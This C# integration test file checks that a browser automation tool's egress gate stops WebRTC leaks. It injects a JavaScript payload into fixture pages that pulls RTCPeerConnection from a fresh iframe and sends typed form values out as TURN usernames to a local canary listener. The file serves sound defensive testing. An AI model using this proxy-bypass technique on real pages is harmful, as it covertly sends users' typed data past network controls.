using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using JobsFinder.BrowserAutomation;
using Microsoft.Playwright;

namespace JobsFinder.IntegrationTests.Applying;

/// <summary>
/// UDP does not go through the gate's proxy, so WebRTC is the one way around it (review M5). The canary listens on this
/// machine's own addresses: nothing is sent to anybody else.
/// </summary>
[Collection(ApiTestGroup.Name)]
[Trait("REQ", "F0.3-AC1")]
public sealed class UdpContainmentTests(ApiFactory factory)
{
    private const string Typed = "typed-value-for-the-canary";

    /// <summary>Takes RTCPeerConnection from a fresh frame, where the page guard may not have run yet.</summary>
    private static string Leak(Canary canary) =>
        $$"""
        const leak = async (value) => {
          const frame = document.createElement('iframe');
          document.body.append(frame);
          const Peer = frame.contentWindow.RTCPeerConnection || window.RTCPeerConnection;
          if (!Peer) return;
          const servers = [{{string.Join(", ", canary.Addresses.Select(a => $$"""
            { urls: 'stun:{{a.Address}}:{{a.Udp}}' },
            { urls: 'turn:{{a.Address}}:{{a.Udp}}?transport=udp', username: value, credential: 'c' },
            { urls: 'turn:{{a.Address}}:{{a.Tcp}}?transport=tcp', username: value, credential: 'c' },
            { urls: 'turns:{{a.Address}}:{{a.Tcp}}?transport=tcp', username: value, credential: 'c' }
            """))}}];
          const a = new Peer({ iceServers: servers, iceCandidatePoolSize: 1 });
          const b = new Peer();
          a.createDataChannel('x');
          const offer = await a.createOffer();
          await a.setLocalDescription(offer);
          await b.setRemoteDescription(offer);
          const answer = await b.createAnswer();
          await b.setLocalDescription(answer);
          await a.setRemoteDescription(answer);
          {{string.Join('\n', canary.Addresses.Select((x, i) => $$"""
          await a.addIceCandidate({ candidate: 'candidate:{{i}} 1 udp 2122260223 {{x.Address}} {{x.Udp}} typ host', sdpMid: '0', sdpMLineIndex: 0 }).catch(() => {});
          """))}}
        };
        """;

    [Fact]
    public async Task PlainBrowser_SendsTheTypedValueOverUdp_NegativeControl_F0_3_AC1()
    {
        await using var canary = new Canary();

        await LeakFromAsync(new BrowserTypeLaunchOptions(), canary);

        Assert.True(canary.Packets > 0, "The canary cannot be reached at all, so the tests below would prove nothing.");
        Assert.True(canary.SawTypedValue, "The value did not arrive, so the tests below would prove nothing.");
    }

    /// <summary>The launch options alone: no page guard, not offline, gate open.</summary>
    [Fact]
    public async Task LaunchOptions_Alone_LetNoUdpOrTcpPastTheGate_F0_3_AC1()
    {
        await using var canary = new Canary();
        await using var gate = EgressGate.Start((_, _) => throw new SocketException((int)SocketError.HostUnreachable));

        await LeakFromAsync(PlaywrightAutomationService.LaunchOptions(gate), canary);

        Assert.Equal((0, 0, false), (canary.Packets, canary.Connections, canary.SawTypedValue));
    }

    [Fact]
    public async Task HandleAsync_PageUsesWebRtc_NothingLeaves_F0_3_AC1()
    {
        await using var canary = new Canary();
        await using var host = await ApplyHost.StartAsync(factory);

        // Also before anything is typed, while the page is still online.
        var run = await host.RunAsync(FixturePages.NewBoard(
            "<div style=\"height: 10px\"></div>",
            Leak(canary) + "leak('early').catch(() => {}); document.getElementById('email').addEventListener('input', (e) => leak(e.target.value).catch(() => {}));"));

        Assert.Contains("contact.email", host.Spy.Typed);
        Assert.NotEmpty(run.Fields);
        await Task.Delay(500);
        Assert.Equal((0, 0), (canary.Packets, canary.Connections));
    }

    private static async Task LeakFromAsync(BrowserTypeLaunchOptions options, Canary canary)
    {
        using var playwright = await Playwright.CreateAsync();
        await using var browser = await playwright.Chromium.LaunchAsync(options);
        var page = await browser.NewPageAsync();
        await page.SetContentAsync("<body></body>");
        await page.EvaluateAsync($"async () => {{ {Leak(canary)} await leak('{Typed}'); }}");
        await Task.Delay(3000);
    }

    /// <summary>UDP and TCP on loopback and on this machine's own network address; answers TURN so that it names the user.</summary>
    private sealed class Canary : IAsyncDisposable
    {
        private readonly CancellationTokenSource _stop = new();
        private readonly List<(UdpClient Udp, TcpListener Tcp, IPAddress Address)> _listeners = [];
        private readonly List<Task> _running = [];
        private int _packets;
        private int _connections;
        private volatile bool _sawTypedValue;

        public Canary()
        {
            foreach (var address in OwnAddresses())
            {
                var udp = new UdpClient(new IPEndPoint(address, 0));
                var tcp = new TcpListener(address, 0);
                tcp.Start();
                _listeners.Add((udp, tcp, address));
                _running.Add(ReceiveAsync(udp));
                _running.Add(AcceptAsync(tcp));
            }
        }

        public int Packets => _packets;

        public int Connections => _connections;

        public bool SawTypedValue => _sawTypedValue;

        public IEnumerable<(IPAddress Address, int Udp, int Tcp)> Addresses => _listeners.Select(l =>
            (l.Address, ((IPEndPoint)l.Udp.Client.LocalEndPoint!).Port, ((IPEndPoint)l.Tcp.LocalEndpoint).Port));

        public async ValueTask DisposeAsync()
        {
            await _stop.CancelAsync();
            await Task.WhenAll(_running);
            foreach (var (udp, tcp, _) in _listeners)
            {
                udp.Dispose();
                tcp.Dispose();
            }

            _stop.Dispose();
        }

        private static IEnumerable<IPAddress> OwnAddresses() =>
            NetworkInterface.GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .OrderByDescending(n => n.GetIPProperties().GatewayAddresses.Count)
                .SelectMany(n => n.GetIPProperties().UnicastAddresses)
                .Select(a => a.Address)
                .Where(a => a.AddressFamily == AddressFamily.InterNetwork)
                .Take(1)
                .Append(IPAddress.Loopback);

        private async Task ReceiveAsync(UdpClient udp)
        {
            while (true)
            {
                try
                {
                    var packet = await udp.ReceiveAsync(_stop.Token);
                    Interlocked.Increment(ref _packets);
                    if (Encoding.ASCII.GetString(packet.Buffer).Contains(Typed, StringComparison.Ordinal))
                    {
                        _sawTypedValue = true;
                    }

                    // A TURN allocate without credentials: asking for them makes the browser send the user name.
                    if (packet.Buffer.Length >= 20 && packet.Buffer[0] == 0 && packet.Buffer[1] == 3)
                    {
                        await udp.SendAsync(AskForCredentials(packet.Buffer), packet.RemoteEndPoint, _stop.Token);
                    }
                }
                catch (OperationCanceledException)
                {
                    return;
                }
                catch (SocketException)
                {
                    // The other end is gone; Windows reports that on the next receive.
                }
            }
        }

        private async Task AcceptAsync(TcpListener tcp)
        {
            try
            {
                while (true)
                {
                    using var connection = await tcp.AcceptSocketAsync(_stop.Token);
                    Interlocked.Increment(ref _connections);
                }
            }
            catch (OperationCanceledException)
            {
                // Disposed.
            }
        }

        private static byte[] AskForCredentials(byte[] request)
        {
            byte[] body = [.. Attribute(0x09, [0, 0, 4, 1]), .. Attribute(0x14, "test"u8.ToArray()), .. Attribute(0x15, "nonc"u8.ToArray())];
            return [0x01, 0x13, 0, (byte)body.Length, .. request[4..20], .. body];
        }

        private static byte[] Attribute(byte type, byte[] value) => [0, type, 0, (byte)value.Length, .. value];
    }
}
